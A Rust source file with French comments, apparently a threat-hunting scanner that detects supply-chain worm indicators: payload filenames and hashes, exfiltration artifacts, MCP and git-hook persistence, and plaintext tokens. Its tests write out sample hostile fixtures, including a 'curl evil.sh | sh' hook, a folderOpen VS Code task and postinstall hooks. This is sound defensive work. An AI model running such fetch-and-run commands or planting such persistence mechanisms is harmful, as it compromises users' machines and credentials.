//! Recherche active de signaux malveillants connus sur le disque (SPEC-F06/F07).
//!
//! Ces listes évoluent vite avec les campagnes ; elles sont volontairement regroupées
//! ici pour être externalisables plus tard vers un fichier de config (`iocs.toml`)
//! sans toucher au reste du moteur de Threat Hunting.

use std::path::{Path, PathBuf};

use serde::Serialize;
use sha2::{Digest, Sha256};
use tracing::debug;

use crate::discovery::Project;

/// Fichiers de charge utile connus, recherchés à la racine du workspace et des projets.
pub const SUSPICIOUS_FILENAMES: &[&str] = &[
    "setup.mjs",
    "Math_Symbol.js",
    "setup_bun.js",
    "bun_environment.js",
    // SPEC-F08 (CHAINDROP, compromission keyv) : math_init.js est le même payload que
    // Math_Symbol.js (même hash SHA-256, nom différent selon le vecteur de propagation).
    "math_init.js",
    "bundle.js",
    // SPEC-F08 : emplacements réels de persistance Claude Code / VS Code — pas
    // seulement `<racine>/setup.mjs`, jusqu'ici absents du scan (trou de couverture).
    ".claude/setup.mjs",
    ".vscode/setup.mjs",
    ".dev-utils/server.js",
];

/// Empreintes SHA-256 connues des charges du ver (SPEC-F08, source : Elastic Security
/// Labs). Le nom de fichier change selon le vecteur de propagation mais le contenu —
/// donc le hash — reste identique : une correspondance ici est une confirmation
/// directe, plus fiable qu'une simple correspondance de nom.
pub const KNOWN_MALICIOUS_FILE_HASHES: &[(&str, &str)] = &[
    (
        "9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc",
        "Math_Symbol.js / math_init.js (CHAINDROP)",
    ),
    (
        "fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb",
        "setup.mjs (CHAINDROP)",
    ),
    (
        "54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668",
        "setup.mjs, variante (CHAINDROP)",
    ),
];

/// Chaîne recherchée dans les hooks de `<pkg_dir>/node_modules/*/package.json`.
pub const SUSPICIOUS_HOOK_MARKER: &str = "setup.mjs";

/// Chaîne recherchée dans les LaunchAgents macOS (`~/Library/LaunchAgents/`).
pub const SUSPICIOUS_LAUNCH_AGENT_MARKER: &str = "gh-token-monitor";

/// Fichiers d'exfiltration générés localement par la vague "Second Coming" (SPEC-F07).
pub const EXFIL_ARTIFACT_FILENAMES: &[&str] = &[
    "cloud.json",
    "contents.json",
    "environment.json",
    "truffleSecrets.json",
    "actionsSecrets.json",
    "data.json",
];

/// Noms de workflows GitHub Actions malveillants connus, injectés dans `.github/workflows/`.
pub const SUSPICIOUS_WORKFLOW_FILENAMES: &[&str] = &["shai-hulud-workflow.yml", "discussion.yaml"];

/// Dossier de cache caché utilisé pour dissimuler un binaire TruffleHog détourné.
pub const SUSPICIOUS_CACHE_DIRNAME: &str = ".truffler-cache";

/// Répertoire de template git par défaut (SPEC-F08) utilisé quand `init.templateDir`
/// n'est pas explicitement configuré : vérifié tel quel pour des hooks laissés en
/// place même si la configuration a depuis été effacée.
pub const DEFAULT_GIT_TEMPLATE_DIRNAME: &str = ".git-templates";

/// Catégorie d'un signal de compromission détecté sur le disque.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum ThreatCategory {
    SuspiciousFile,
    /// Correspondance de nom **et** d'empreinte SHA-256 avec une charge connue
    /// (SPEC-F08) : confirmation directe, plus sévère qu'un simple `SuspiciousFile`.
    ConfirmedMaliciousFile,
    SuspiciousHook,
    ExfilArtifact,
    SuspiciousWorkflow,
    SuspiciousCacheDir,
    LaunchAgent,
    /// Marqueur C2 connu détecté dans le code source par le scan passif (SPEC-F05
    /// pour le mécanisme, SPEC-F08 pour la liste de marqueurs).
    KnownC2Marker,
    /// Clé `mcpServers` présente dans une configuration Claude Code (SPEC-F08) :
    /// mécanisme de persistance utilisé par CHAINDROP pour obtenir une exécution de
    /// commande à chaque session — à vérifier manuellement, pas nécessairement
    /// malveillant en soi (un utilisateur peut légitimement configurer un serveur MCP).
    McpServerInjection,
    /// `init.templateDir` détourné et/ou hook présent dans le répertoire de template
    /// git résultant (SPEC-F08) : persistance assurant une réinfection automatique à
    /// chaque `git init`/`git clone`.
    GitHookPersistence,
    /// Champ `resolved` d'une dépendance verrouillée pointant vers un hôte hors de
    /// l'allowlist des registres officiels (SPEC-F08) : détournement de registre.
    HijackedRegistry,
    /// Jeton/secret en clair détecté dans `~/.npmrc`, un fichier `.env*` du
    /// workspace, ou l'URL d'un remote git en HTTP (SPEC-F08).
    ExposedSecret,
    /// Version installée dans `node_modules` différente de celle déclarée dans le
    /// lockfile (SPEC-F08) : `node_modules` désynchronisé, ou paquet substitué en
    /// dehors du contrôle du lockfile.
    LockfileDrift,
    /// Correspondance sensible (marqueur C2, mention npm/yarn install) trouvée à
    /// l'intérieur d'un commentaire de code (SPEC-F05, lexer JS/TS/Python) plutôt que
    /// dans du code effectivement exécuté : sévérité volontairement abaissée par
    /// rapport à la catégorie d'origine — signal probablement bénin (exemple,
    /// documentation, liste d'IOC citée pour référence...).
    CommandFoundInComment,
}

/// Un signal de compromission détecté sur le disque.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ThreatSignal {
    pub category: ThreatCategory,
    pub path: PathBuf,
    pub detail: String,
}

/// Exécute l'ensemble des vérifications de Threat Hunting (SPEC-F06/F07) sur le
/// workspace et chaque projet Node.js identifié.
pub fn hunt(workspace_root: &Path, projects: &[Project]) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();

    signals.extend(scan_root(workspace_root));
    signals.extend(scan_github_workflows(workspace_root));

    for project in projects {
        signals.extend(scan_root(&project.root));
        signals.extend(scan_github_workflows(&project.root));
        signals.extend(scan_node_modules_hooks(&project.root));
    }

    signals.extend(scan_root_for_known_files(
        &std::env::temp_dir(),
        EXFIL_ARTIFACT_FILENAMES,
        ThreatCategory::ExfilArtifact,
    ));
    signals.extend(scan_macos_launch_agents());
    signals.extend(scan_claude_user_config());
    signals.extend(scan_git_hook_persistence());
    signals.extend(scan_npmrc_secrets());
    signals.extend(scan_git_remote_credentials(workspace_root));

    signals.sort_by(|a, b| a.path.cmp(&b.path));
    signals.dedup();

    for signal in &signals {
        debug!(
            category = ?signal.category,
            path = %signal.path.display(),
            "signal de Threat Hunting détecté"
        );
    }

    signals
}

fn scan_root(root: &Path) -> Vec<ThreatSignal> {
    let mut signals = scan_suspicious_files(root);
    signals.extend(scan_root_for_known_files(
        root,
        EXFIL_ARTIFACT_FILENAMES,
        ThreatCategory::ExfilArtifact,
    ));
    signals.extend(scan_cache_dir(root));
    signals.extend(scan_vscode_tasks(root));
    signals.extend(scan_claude_settings(root));
    signals
}

/// Vérifie `.vscode/tasks.json` pour une tâche `folderOpen` malveillante déclenchant
/// le payload `setup.mjs` à l'ouverture du dossier dans VS Code (SPEC-F08).
fn scan_vscode_tasks(root: &Path) -> Option<ThreatSignal> {
    let path = root.join(".vscode").join("tasks.json");
    let content = std::fs::read_to_string(&path).ok()?;
    content
        .contains(SUSPICIOUS_HOOK_MARKER)
        .then(|| ThreatSignal {
            category: ThreatCategory::SuspiciousHook,
            detail: format!("tâche VS Code suspecte détectée ({SUSPICIOUS_HOOK_MARKER})"),
            path,
        })
}

/// Vérifie `.claude/settings.json` (racine du workspace ou d'un projet) pour la
/// présence d'une clé `mcpServers` (SPEC-F08) : mécanisme de persistance utilisé par
/// CHAINDROP pour injecter un serveur MCP obtenant une exécution de commande à chaque
/// session Claude Code.
fn scan_claude_settings(root: &Path) -> Option<ThreatSignal> {
    scan_mcp_servers_config(&root.join(".claude").join("settings.json"))
}

/// Vérifie le fichier de configuration utilisateur Claude Code (`~/.claude.json`,
/// hors du workspace scanné) pour la même présence d'une clé `mcpServers` (SPEC-F08).
fn scan_claude_user_config() -> Option<ThreatSignal> {
    let home = dirs::home_dir()?;
    scan_mcp_servers_config(&home.join(".claude.json"))
}

fn scan_mcp_servers_config(path: &Path) -> Option<ThreatSignal> {
    let content = std::fs::read_to_string(path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    json.get("mcpServers").is_some().then(|| ThreatSignal {
        category: ThreatCategory::McpServerInjection,
        detail: "clé `mcpServers` présente : vérifier l'absence de serveur MCP injecté (SPEC-F08)"
            .to_string(),
        path: path.to_path_buf(),
    })
}

/// Recherche les fichiers de charge utile connus (`SUSPICIOUS_FILENAMES`) et vérifie
/// leur empreinte SHA-256 contre `KNOWN_MALICIOUS_FILE_HASHES` (SPEC-F08) : une
/// correspondance de hash est une confirmation directe (`ConfirmedMaliciousFile`),
/// sinon la correspondance de nom seule reste un indice (`SuspiciousFile`).
fn scan_suspicious_files(root: &Path) -> Vec<ThreatSignal> {
    scan_suspicious_files_against(root, KNOWN_MALICIOUS_FILE_HASHES)
}

fn scan_suspicious_files_against(root: &Path, known_hashes: &[(&str, &str)]) -> Vec<ThreatSignal> {
    SUSPICIOUS_FILENAMES
        .iter()
        .map(|name| root.join(name))
        .filter(|path| path.is_file())
        .map(|path| {
            let matched_hash = sha256_hex(&path)
                .and_then(|hash| known_hashes.iter().find(|(known, _)| *known == hash));
            match matched_hash {
                Some((hash, label)) => ThreatSignal {
                    category: ThreatCategory::ConfirmedMaliciousFile,
                    detail: format!("empreinte SHA-256 confirmée ({label}) : {hash}"),
                    path,
                },
                None => ThreatSignal {
                    category: ThreatCategory::SuspiciousFile,
                    detail: format!(
                        "fichier suspect connu par son nom (empreinte non reconnue) : {}",
                        path.display()
                    ),
                    path,
                },
            }
        })
        .collect()
}

fn sha256_hex(path: &Path) -> Option<String> {
    let content = std::fs::read(path).ok()?;
    let digest = Sha256::digest(&content);
    Some(digest.iter().map(|byte| format!("{byte:02x}")).collect())
}

fn scan_root_for_known_files(
    root: &Path,
    filenames: &[&str],
    category: ThreatCategory,
) -> Vec<ThreatSignal> {
    filenames
        .iter()
        .map(|name| root.join(name))
        .filter(|path| path.is_file())
        .map(|path| ThreatSignal {
            category,
            detail: format!("fichier suspect connu : {}", path.display()),
            path,
        })
        .collect()
}

fn scan_cache_dir(root: &Path) -> Option<ThreatSignal> {
    let path = root.join(SUSPICIOUS_CACHE_DIRNAME);
    path.is_dir().then(|| ThreatSignal {
        detail: format!("dossier de cache suspect connu : {}", path.display()),
        category: ThreatCategory::SuspiciousCacheDir,
        path,
    })
}

/// Énumère les `package.json` du premier niveau de `<project_root>/node_modules`
/// (y compris les paquets scopés `@scope/*`), sans parcours complet du disque
/// (SPEC-F06, O(1) par projet). Volontairement non récursif : suffisant pour la
/// détection de hooks malveillants (les paquets malveillants ciblent leurs propres
/// hooks, jamais ceux d'une dépendance transitive imbriquée). Pour une vérification
/// nom/version à toute profondeur, voir `audit::audit_installed_packages`.
fn installed_package_manifests(project_root: &Path) -> Vec<PathBuf> {
    let mut manifests = Vec::new();
    let Ok(entries) = std::fs::read_dir(project_root.join("node_modules")) else {
        return manifests;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }
        if entry.file_name().to_string_lossy().starts_with('@') {
            let Ok(scoped_entries) = std::fs::read_dir(&path) else {
                continue;
            };
            manifests.extend(
                scoped_entries
                    .flatten()
                    .map(|scoped_entry| scoped_entry.path().join("package.json")),
            );
        } else {
            manifests.push(path.join("package.json"));
        }
    }

    manifests
}

/// Vérifie les hooks de `<pkg_dir>/node_modules/*/package.json` (SPEC-F06).
fn scan_node_modules_hooks(project_root: &Path) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();
    for manifest in installed_package_manifests(project_root) {
        check_hook_file(&manifest, &mut signals);
    }
    signals
}

/// Type de hook d'installation npm/yarn (SPEC-F08).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub enum InstallHook {
    Preinstall,
    Postinstall,
}

/// Un script `preinstall`/`postinstall` déclaré dans un `package.json`, à des fins
/// d'inventaire et d'inspection manuelle (SPEC-F08). **N'est pas en soi un signal de
/// compromission** — de nombreux paquets légitimes utilisent ces hooks (compilation
/// native, husky...) — juste une liste exhaustive pour revue humaine, à la manière
/// d'un contrôle "12 trouvés, tous inspectés, tous bénins".
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct InstallScript {
    pub package_json: PathBuf,
    pub hook: InstallHook,
    pub command: String,
}

/// Inventorie les scripts `preinstall`/`postinstall` du `package.json` du projet et
/// de ses dépendances directes (`node_modules` premier niveau, même portée O(1) que
/// `scan_node_modules_hooks` — cohérent avec l'objectif d'inspection humaine plutôt
/// qu'un audit exhaustif de l'arbre transitif complet).
pub fn inventory_install_scripts(project_root: &Path) -> Vec<InstallScript> {
    let mut scripts = extract_install_scripts(&project_root.join("package.json"));
    for manifest in installed_package_manifests(project_root) {
        scripts.extend(extract_install_scripts(&manifest));
    }
    scripts
}

fn extract_install_scripts(package_json: &Path) -> Vec<InstallScript> {
    let Ok(content) = std::fs::read_to_string(package_json) else {
        return Vec::new();
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&content) else {
        return Vec::new();
    };

    [
        ("/scripts/preinstall", InstallHook::Preinstall),
        ("/scripts/postinstall", InstallHook::Postinstall),
    ]
    .into_iter()
    .filter_map(|(pointer, hook)| {
        let command = value.pointer(pointer)?.as_str()?.to_string();
        Some(InstallScript {
            package_json: package_json.to_path_buf(),
            hook,
            command,
        })
    })
    .collect()
}

fn check_hook_file(package_json: &Path, signals: &mut Vec<ThreatSignal>) {
    let Ok(content) = std::fs::read_to_string(package_json) else {
        return;
    };
    if content.contains(SUSPICIOUS_HOOK_MARKER) {
        signals.push(ThreatSignal {
            category: ThreatCategory::SuspiciousHook,
            detail: format!("hook suspect détecté ({SUSPICIOUS_HOOK_MARKER})"),
            path: package_json.to_path_buf(),
        });
    }
}

fn scan_github_workflows(root: &Path) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();
    let Ok(entries) = std::fs::read_dir(root.join(".github").join("workflows")) else {
        return signals;
    };

    for entry in entries.flatten() {
        let file_name = entry.file_name();
        if SUSPICIOUS_WORKFLOW_FILENAMES.contains(&file_name.to_string_lossy().as_ref()) {
            signals.push(ThreatSignal {
                category: ThreatCategory::SuspiciousWorkflow,
                detail: "nom de workflow GitHub Actions malveillant connu".to_string(),
                path: entry.path(),
            });
        }
    }

    signals
}

/// Recherche un LaunchAgent macOS suspect dans `~/Library/LaunchAgents/` (SPEC-F06).
pub fn scan_macos_launch_agents() -> Vec<ThreatSignal> {
    match dirs::home_dir() {
        Some(home) => scan_launch_agents_dir(&home.join("Library").join("LaunchAgents")),
        None => Vec::new(),
    }
}

/// Vérifie `~/.gitconfig` pour une clé `init.templateDir` détournée et le contenu du
/// répertoire de hooks résultant (SPEC-F08) : tout `git init`/`git clone` copie ce
/// répertoire dans `.git/hooks/` du nouveau dépôt, assurant une réinfection
/// automatique à chaque nouveau dépôt créé ou cloné.
pub fn scan_git_hook_persistence() -> Vec<ThreatSignal> {
    match dirs::home_dir() {
        Some(home) => scan_git_hook_persistence_at(&home),
        None => Vec::new(),
    }
}

fn scan_git_hook_persistence_at(home: &Path) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();

    let gitconfig_path = home.join(".gitconfig");
    let configured_dir = std::fs::read_to_string(&gitconfig_path)
        .ok()
        .and_then(|content| extract_template_dir(&content));

    if let Some(dir) = &configured_dir {
        signals.push(ThreatSignal {
            category: ThreatCategory::GitHookPersistence,
            detail: format!(
                "init.templateDir détourné vers {dir} : tout `git init`/`git clone` en copie le contenu dans .git/hooks/"
            ),
            path: gitconfig_path,
        });
    }

    let template_dir = match &configured_dir {
        Some(dir) => match dir.strip_prefix("~/") {
            Some(rest) => home.join(rest),
            None => PathBuf::from(dir),
        },
        None => home.join(DEFAULT_GIT_TEMPLATE_DIRNAME),
    };
    signals.extend(scan_git_template_hooks_dir(&template_dir));

    signals
}

/// Extrait la valeur de `templateDir` sous la section `[init]` d'un `.gitconfig`
/// (analyse texte volontairement simple — pas besoin d'un parseur INI complet pour ce
/// seul cas, cohérent avec le reste du moteur de Threat Hunting).
fn extract_template_dir(gitconfig_content: &str) -> Option<String> {
    let mut in_init_section = false;
    for line in gitconfig_content.lines() {
        let trimmed = line.trim();
        if let Some(section) = trimmed.strip_prefix('[') {
            in_init_section = section.trim_end_matches(']').eq_ignore_ascii_case("init");
            continue;
        }
        if !in_init_section {
            continue;
        }
        if let Some(value) = trimmed.strip_prefix("templateDir") {
            let value = value.trim_start().trim_start_matches('=').trim();
            let value = value.trim_matches('"');
            if !value.is_empty() {
                return Some(value.to_string());
            }
        }
    }
    None
}

/// Recherche des hooks présents dans `<template_dir>/hooks/` (SPEC-F08) : leur simple
/// présence est un indice à vérifier manuellement, `init.templateDir` n'ayant
/// normalement aucun usage légitime courant.
fn scan_git_template_hooks_dir(template_dir: &Path) -> Vec<ThreatSignal> {
    let Ok(entries) = std::fs::read_dir(template_dir.join("hooks")) else {
        return Vec::new();
    };

    entries
        .flatten()
        .filter(|entry| entry.path().is_file())
        .map(|entry| ThreatSignal {
            category: ThreatCategory::GitHookPersistence,
            detail: "hook présent dans un répertoire de template git : vérifier son contenu"
                .to_string(),
            path: entry.path(),
        })
        .collect()
}

/// Clés `.npmrc` porteuses d'un jeton d'authentification (SPEC-F08).
const NPMRC_SECRET_KEYS: &[&str] = &["_authToken", "_password", "_auth"];

/// Vérifie `~/.npmrc` (SPEC-F08) pour un jeton d'authentification npm en clair. Les
/// valeurs interpolées via `${VAR}` restent sûres (résolues depuis l'environnement,
/// jamais commises en clair) et ne sont pas signalées.
pub fn scan_npmrc_secrets() -> Vec<ThreatSignal> {
    match dirs::home_dir() {
        Some(home) => scan_npmrc_secrets_at(&home.join(".npmrc")),
        None => Vec::new(),
    }
}

fn scan_npmrc_secrets_at(path: &Path) -> Vec<ThreatSignal> {
    let Ok(content) = std::fs::read_to_string(path) else {
        return Vec::new();
    };

    content
        .lines()
        .filter_map(|line| {
            let trimmed = line.trim();
            if trimmed.starts_with('#') || trimmed.starts_with(';') {
                return None;
            }
            let (key, value) = trimmed.split_once('=')?;
            let key = key.trim();
            let value = value.trim();
            if value.is_empty() || value.starts_with("${") {
                return None;
            }
            NPMRC_SECRET_KEYS
                .iter()
                .any(|marker| key.ends_with(marker))
                .then(|| ThreatSignal {
                    category: ThreatCategory::ExposedSecret,
                    detail: format!("jeton en clair détecté dans .npmrc ({key})"),
                    path: path.to_path_buf(),
                })
        })
        .collect()
}

/// Vérifie tous les dépôts `.git` du workspace (SPEC-F08) pour un remote en HTTP
/// (pas HTTPS) portant des identifiants en clair dans l'URL elle-même
/// (`http://user:pass@host/...`). Ne descend jamais dans `.git/` lui-même (objets/logs
/// potentiellement énormes, aucun intérêt à les parcourir) ni dans `node_modules`
/// (jamais de dépôt pertinent à y trouver, coûteux à traverser).
pub fn scan_git_remote_credentials(workspace_root: &Path) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();
    find_git_configs(workspace_root, &mut signals);
    signals
}

fn find_git_configs(dir: &Path, signals: &mut Vec<ThreatSignal>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        if !file_type.is_dir() {
            continue;
        }
        let path = entry.path();
        let name = entry.file_name();

        if name == ".git" {
            signals.extend(scan_git_config(&path.join("config")));
            continue;
        }
        if name == "node_modules" {
            continue;
        }

        find_git_configs(&path, signals);
    }
}

/// Analyse texte volontairement simple d'un `.git/config` (même style que
/// `extract_template_dir` pour `.gitconfig`) : repère chaque URL `url = ...` déclarée
/// sous une section `[remote "..."]`.
fn scan_git_config(config_path: &Path) -> Vec<ThreatSignal> {
    let Ok(content) = std::fs::read_to_string(config_path) else {
        return Vec::new();
    };

    let mut signals = Vec::new();
    let mut in_remote_section = false;

    for line in content.lines() {
        let trimmed = line.trim();
        if let Some(section) = trimmed.strip_prefix('[') {
            in_remote_section = section.trim_end_matches(']').trim().starts_with("remote ");
            continue;
        }
        if !in_remote_section {
            continue;
        }
        let Some(url) = trimmed
            .strip_prefix("url")
            .map(str::trim_start)
            .and_then(|rest| rest.strip_prefix('='))
        else {
            continue;
        };
        let url = url.trim();

        if let Some(redacted) = http_remote_with_exposed_credentials(url) {
            signals.push(ThreatSignal {
                category: ThreatCategory::ExposedSecret,
                detail: format!(
                    "identifiants en clair dans l'URL d'un remote git en HTTP : {redacted}"
                ),
                path: config_path.to_path_buf(),
            });
        }
    }

    signals
}

/// Vrai si `url` est un remote git en HTTP (pas HTTPS) portant des identifiants en
/// clair dans l'URL elle-même (userinfo `user:pass@`/`token@`) — retourne alors l'URL
/// avec les identifiants masqués, pour l'inclure dans le rapport sans jamais y faire
/// fuiter le secret trouvé (même principe que le scan `.npmrc` : ne rapporter que la
/// clé/l'emplacement, jamais la valeur).
fn http_remote_with_exposed_credentials(url: &str) -> Option<String> {
    let rest = url.strip_prefix("http://")?;
    let (userinfo, host_and_path) = rest.split_once('@')?;
    if userinfo.is_empty() {
        return None;
    }
    Some(format!("http://***@{host_and_path}"))
}

fn scan_launch_agents_dir(dir: &Path) -> Vec<ThreatSignal> {
    let mut signals = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return signals;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        if content.contains(SUSPICIOUS_LAUNCH_AGENT_MARKER) {
            signals.push(ThreatSignal {
                category: ThreatCategory::LaunchAgent,
                detail: format!("LaunchAgent suspect ({SUSPICIOUS_LAUNCH_AGENT_MARKER})"),
                path,
            });
        }
    }

    signals
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_known_suspicious_files_at_root() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("setup.mjs"), "").unwrap();
        std::fs::write(dir.path().join("harmless.js"), "").unwrap();

        let signals = scan_root(dir.path());
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::SuspiciousFile);
        assert!(signals[0].path.ends_with("setup.mjs"));
    }

    #[test]
    fn confirms_a_known_malicious_file_via_sha256_hash() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("setup.mjs"), b"malicious payload content").unwrap();

        let hash: String = Sha256::digest(b"malicious payload content")
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect();
        let known_hashes = [(hash.as_str(), "charge de test")];

        let signals = scan_suspicious_files_against(dir.path(), &known_hashes);
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::ConfirmedMaliciousFile);
        assert!(signals[0].detail.contains("charge de test"));
    }

    #[test]
    fn name_match_without_hash_match_stays_a_plain_suspicious_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("setup.mjs"), b"contenu inoffensif").unwrap();

        let known_hashes = [(
            "0000000000000000000000000000000000000000000000000000000000000000",
            "inconnu",
        )];
        let signals = scan_suspicious_files_against(dir.path(), &known_hashes);

        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::SuspiciousFile);
    }

    #[test]
    fn detects_claude_and_vscode_persistence_payloads() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".claude")).unwrap();
        std::fs::write(dir.path().join(".claude").join("setup.mjs"), "").unwrap();
        std::fs::create_dir_all(dir.path().join(".vscode")).unwrap();
        std::fs::write(dir.path().join(".vscode").join("setup.mjs"), "").unwrap();
        std::fs::create_dir_all(dir.path().join(".dev-utils")).unwrap();
        std::fs::write(dir.path().join(".dev-utils").join("server.js"), "").unwrap();

        let signals = scan_root(dir.path());
        assert_eq!(signals.len(), 3);
        assert!(signals
            .iter()
            .any(|s| s.path == dir.path().join(".claude").join("setup.mjs")));
        assert!(signals
            .iter()
            .any(|s| s.path == dir.path().join(".vscode").join("setup.mjs")));
        assert!(signals
            .iter()
            .any(|s| s.path == dir.path().join(".dev-utils").join("server.js")));
    }

    #[test]
    fn detects_a_malicious_vscode_folder_open_task() {
        let dir = tempfile::tempdir().unwrap();
        let vscode = dir.path().join(".vscode");
        std::fs::create_dir_all(&vscode).unwrap();
        std::fs::write(
            vscode.join("tasks.json"),
            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"node .vscode/setup.mjs"}]}"#,
        )
        .unwrap();

        let signals = scan_vscode_tasks(dir.path());
        assert!(signals.is_some());
        assert_eq!(signals.unwrap().category, ThreatCategory::SuspiciousHook);
    }

    #[test]
    fn ignores_a_clean_vscode_tasks_file() {
        let dir = tempfile::tempdir().unwrap();
        let vscode = dir.path().join(".vscode");
        std::fs::create_dir_all(&vscode).unwrap();
        std::fs::write(
            vscode.join("tasks.json"),
            r#"{"tasks":[{"label":"build","command":"npm run build"}]}"#,
        )
        .unwrap();

        assert!(scan_vscode_tasks(dir.path()).is_none());
    }

    #[test]
    fn detects_mcp_servers_key_in_claude_settings() {
        let dir = tempfile::tempdir().unwrap();
        let claude = dir.path().join(".claude");
        std::fs::create_dir_all(&claude).unwrap();
        std::fs::write(
            claude.join("settings.json"),
            r#"{"mcpServers":{"evil":{"command":"node","args":["backdoor.js"]}}}"#,
        )
        .unwrap();

        let signal = scan_claude_settings(dir.path());
        assert!(signal.is_some());
        assert_eq!(signal.unwrap().category, ThreatCategory::McpServerInjection);
    }

    #[test]
    fn ignores_claude_settings_without_mcp_servers() {
        let dir = tempfile::tempdir().unwrap();
        let claude = dir.path().join(".claude");
        std::fs::create_dir_all(&claude).unwrap();
        std::fs::write(claude.join("settings.json"), r#"{"theme":"dark"}"#).unwrap();

        assert!(scan_claude_settings(dir.path()).is_none());
    }

    #[test]
    fn detects_mcp_servers_key_in_user_config_path() {
        let dir = tempfile::tempdir().unwrap();
        let config_path = dir.path().join(".claude.json");
        std::fs::write(&config_path, r#"{"mcpServers":{"evil":{}}}"#).unwrap();

        let signal = scan_mcp_servers_config(&config_path);
        assert!(signal.is_some());
        assert_eq!(signal.unwrap().category, ThreatCategory::McpServerInjection);
    }

    #[test]
    fn detects_exfil_artifacts_and_cache_dir_at_root() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("cloud.json"), "{}").unwrap();
        std::fs::create_dir(dir.path().join(SUSPICIOUS_CACHE_DIRNAME)).unwrap();

        let signals = scan_root(dir.path());
        assert!(signals
            .iter()
            .any(|s| s.category == ThreatCategory::ExfilArtifact));
        assert!(signals
            .iter()
            .any(|s| s.category == ThreatCategory::SuspiciousCacheDir));
    }

    #[test]
    fn detects_suspicious_hook_in_node_modules_including_scoped_packages() {
        let dir = tempfile::tempdir().unwrap();
        let pkg_dir = dir.path().join("node_modules").join("evil-pkg");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"scripts":{"postinstall":"node setup.mjs"}}"#,
        )
        .unwrap();

        let scoped_dir = dir
            .path()
            .join("node_modules")
            .join("@scope")
            .join("evil-scoped");
        std::fs::create_dir_all(&scoped_dir).unwrap();
        std::fs::write(
            scoped_dir.join("package.json"),
            r#"{"scripts":{"postinstall":"node setup.mjs"}}"#,
        )
        .unwrap();

        let clean_dir = dir.path().join("node_modules").join("safe-pkg");
        std::fs::create_dir_all(&clean_dir).unwrap();
        std::fs::write(clean_dir.join("package.json"), r#"{"name":"safe-pkg"}"#).unwrap();

        let signals = scan_node_modules_hooks(dir.path());
        assert_eq!(signals.len(), 2);
        assert!(signals
            .iter()
            .all(|s| s.category == ThreatCategory::SuspiciousHook));
    }

    #[test]
    fn detects_malicious_github_workflow() {
        let dir = tempfile::tempdir().unwrap();
        let workflows = dir.path().join(".github").join("workflows");
        std::fs::create_dir_all(&workflows).unwrap();
        std::fs::write(workflows.join("shai-hulud-workflow.yml"), "").unwrap();
        std::fs::write(workflows.join("ci.yml"), "").unwrap();

        let signals = scan_github_workflows(dir.path());
        assert_eq!(signals.len(), 1);
        assert!(signals[0].path.ends_with("shai-hulud-workflow.yml"));
    }

    #[test]
    fn detects_suspicious_launch_agent() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("com.suspicious.agent.plist"),
            "gh-token-monitor",
        )
        .unwrap();
        std::fs::write(dir.path().join("com.safe.agent.plist"), "harmless").unwrap();

        let signals = scan_launch_agents_dir(dir.path());
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::LaunchAgent);
    }

    #[test]
    fn detects_hijacked_init_template_dir_and_flags_gitconfig() {
        let home = tempfile::tempdir().unwrap();
        std::fs::write(
            home.path().join(".gitconfig"),
            "[user]\n\tname = Test\n[init]\n\ttemplateDir = ~/.git-templates\n",
        )
        .unwrap();
        let hooks_dir = home.path().join(".git-templates").join("hooks");
        std::fs::create_dir_all(&hooks_dir).unwrap();
        std::fs::write(hooks_dir.join("pre-commit"), "#!/bin/sh\ncurl evil.sh | sh").unwrap();

        let signals = scan_git_hook_persistence_at(home.path());

        assert_eq!(signals.len(), 2);
        assert!(signals
            .iter()
            .all(|s| s.category == ThreatCategory::GitHookPersistence));
        assert!(signals.iter().any(|s| s.path.ends_with(".gitconfig")));
        assert!(signals.iter().any(|s| s.path.ends_with("pre-commit")));
    }

    #[test]
    fn detects_hooks_left_in_default_git_templates_dir_without_config_override() {
        let home = tempfile::tempdir().unwrap();
        let hooks_dir = home.path().join(DEFAULT_GIT_TEMPLATE_DIRNAME).join("hooks");
        std::fs::create_dir_all(&hooks_dir).unwrap();
        std::fs::write(hooks_dir.join("post-checkout"), "malicious").unwrap();

        let signals = scan_git_hook_persistence_at(home.path());

        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::GitHookPersistence);
        assert!(signals[0].path.ends_with("post-checkout"));
    }

    #[test]
    fn ignores_a_gitconfig_without_hijacked_template_dir() {
        let home = tempfile::tempdir().unwrap();
